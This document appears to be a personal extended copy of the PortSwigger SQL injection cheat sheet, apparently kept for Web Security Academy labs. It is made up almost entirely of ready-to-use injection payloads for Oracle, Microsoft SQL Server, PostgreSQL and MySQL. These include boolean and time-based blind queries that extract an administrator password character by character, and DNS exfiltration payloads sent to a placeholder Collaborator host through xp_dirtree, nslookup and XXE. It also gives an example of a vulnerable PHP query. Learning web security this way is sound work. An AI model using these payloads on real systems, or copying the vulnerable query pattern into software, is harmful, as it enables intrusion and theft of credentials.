
SQL injection can be detected manually by using a systematic set of tests against every entry point in the application. This typically involves:

-   Submitting the single quote character `'` and looking for errors or other anomalies.
-   Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
-   Submitting Boolean conditions such as `OR 1=1` and `OR 1=2`, and looking for differences in the application's responses.
-   Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
-   Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.

The most common other locations where SQL injection arises are:

-   In `UPDATE` statements, within the updated values or the `WHERE` clause.
-   In `INSERT` statements, within the inserted values.
-   In `SELECT` statements, within the table or column name.
-   In `SELECT` statements, within the `ORDER BY` clause.



# SQL injection cheat sheet

This [SQL injection](https://portswigger.net/web-security/sql-injection) cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

## Miscellanous

The FROM part of the query is evaluated !!BEFORE!! the SELECT statement.
	Example: || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') ||  ====> means, if username administrator exists within the table users, then run the SELECT statement and, since 1=1 is always true, the query tries to divide 1 by 0.
	In this case, the purpose is to confirm existence of administrator username within the database causing an error.

## String concatenation

You can concatenate together multiple strings to make a single string.

Oracle

`'foo'||'bar'`

Microsoft

`'foo'+'bar'`

PostgreSQL

`'foo'||'bar'`

MySQL

`'foo' 'bar'` [Note the space between the two strings]  
`CONCAT('foo','bar')`  

## Substring

You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string `ba`.

Oracle

`SUBSTR('foobar', 4, 2)`

Microsoft

`SUBSTRING('foobar', 4, 2)`

PostgreSQL

`SUBSTRING('foobar', 4, 2)`

MySQL

`SUBSTRING('foobar', 4, 2)`

## Comments

You can use comments to truncate a query and remove the portion of the original query that follows your input.

Oracle

`--comment   `

Microsoft

`--comment   /*comment*/`

PostgreSQL

`--comment   /*comment*/`

MySQL

`#comment`  
`-- comment` [Note the space after the double dash]  
`/*comment*/`

## Database version

You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

Oracle

`SELECT banner FROM v$version   SELECT version FROM v$instance   `

Microsoft

`SELECT @@version`

PostgreSQL

`SELECT version()`

MySQL

`SELECT @@version`

## Database contents

You can list the tables that exist in the database, and the columns that those tables contain.

Oracle

`SELECT * FROM all_tables   SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`

Microsoft

`SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `

PostgreSQL

`SELECT * FROM information_schema.tables `
`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'  `
`UNION SELECT username || '-' || password FROM users`

MySQL

`SELECT * FROM information_schema.tables   SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'   `
`UNION SELECT NULL,username || '-' || password FROM users--`

## Conditional errors

You can test a single boolean condition and trigger a database error if the condition is true.

Oracle

`||SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual||`

`||SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE '' END FROM dual||`

`||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||`

`||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||`

`||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||`

Microsoft

`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`

PostgreSQL

`1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST(1/0 AS INTEGER) ELSE NULL END)`

MySQL

`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`

`' AND (SELECT 'x' FROM [tabella] LIMIT 1)='x`
Substring - for each entry in Table [tabella] output an 'x'  and if it equal to 'x' then it means that the table exists in the database.
Since the table may contain more than one entry, the query limits the output to the first row only.

`' AND (SELECT username FROM users WHERE username='administrator')='administrator'--`
Check whether the username 'administrator' exists in the database

`' AND (SELECT username FROM users WHERE username='administrator' and LENGTH(password)>1)='administrator'--`
Check user's password length. Increase the integer value.

`' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='a'--`
Check if character as position INDEX is equal to 'CHAR'



## Batched (or stacked) queries

You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

Oracle

`Does not support batched queries.`

Microsoft

`QUERY-1-HERE; QUERY-2-HERE`

PostgreSQL

`QUERY-1-HERE; QUERY-2-HERE`

MySQL

`QUERY-1-HERE; QUERY-2-HERE`

#### Note

With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.

## Time delays

You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

Oracle

`dbms_pipe.receive_message(('a'),10)`

Microsoft

`WAITFOR DELAY '0:0:10'`

PostgreSQL

`SELECT pg_sleep(10)`

`|| pg_sleep(10)--`

MySQL

`SELECT SLEEP(10)`

## Conditional time delays

You can test a single boolean condition and trigger a time delay if the condition is true.

Oracle

`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`

Microsoft

`IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`

PostgreSQL

`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
`|| (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END)`


; can be used URL-encoded (%3B) at the start of the injected string in order to close the first string and let the second one to run.
`'%3BSELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`

`;SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users`

`;SELECT CASE WHEN (username='administrator' AND LENGTH (password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`

`;SELECT TrackingId FROM TrackingIdTable WHERE TrackingId = '6XBUFagmsb8Sxv1z';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--`

MySQL

`SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`

## DNS lookup

You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

Oracle

The following technique leverages an XML external entity ([XXE](https://portswigger.net/web-security/xxe)) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:  
`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`  
  
The following technique works on fully patched Oracle installations, but requires elevated privileges:  
`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`

Microsoft

`exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`

PostgreSQL

`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`


MySQL

The following techniques work on Windows only:  
`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`  
`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`

## DNS lookup with data exfiltration

You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use [Burp Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

Oracle

`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`

Microsoft

`declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`

PostgreSQL

`create OR replace function f() returns void as $$   declare c text;   declare p text;   begin   SELECT into p (SELECT YOUR-QUERY-HERE);   c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';   execute c;   END;   $$ language plpgsql security definer;   SELECT f();`

MySQL

The following technique works on Windows only:  
`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`


## Determine SQL databse type

Oracle
If no errore in response, then it is an Oracle database

`||(SELECT '' FROM dual)||'`


## Verify SQL object existence

Oracle 
The `WHERE ROWNUM = 1` condition is important here to prevent the query from returning more than one row, which would break our concatenation.

`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`


```SELECT some,columns,here FROM some_table WHERE some > columns AND here !=0```

```UPDATE some_table SET some=1, columns=2, here=3 WHERE id=5```

```INSERT INTO some_table (some, columns, here) VALUES (1, 2, 3)```

Example of vulnerable SQL query which accepts user input

```php
<?php
$name = $_GET['name'];
$results = mysql_query("SELECT age, grade, teacher FROM students WHERE (name = '$name')");
?>
```

```' OR 1='1-- ``` (constant TRUE returns all rows)  
```' AND 0='1-- ``` (constant FALSE returns no rows)